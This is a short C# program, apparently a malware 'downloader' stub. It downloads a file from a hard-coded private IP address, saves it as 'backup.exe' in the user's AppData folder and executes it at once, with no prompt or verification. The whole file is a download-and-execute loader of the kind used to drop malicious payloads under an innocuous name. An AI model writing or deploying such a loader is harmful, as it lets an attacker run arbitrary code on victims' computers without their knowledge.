using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;

namespace downloader
{

    public class Program
    {
        string fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "backup.exe");
        [STAThread]
        static void Main()
        {
            Uri url = new Uri("http://192.168.2.164");
            Program prog = new Program();
            prog.get_not(url);
        }
        public void get_not(Uri url)
        {
            if (File.Exists(fileName))
            {
                File.Delete(fileName);
            }
            WebClient wc = new WebClient();
            wc.DownloadFile(url, fileName);
            Process.Start(fileName);
        }

    }
            
}
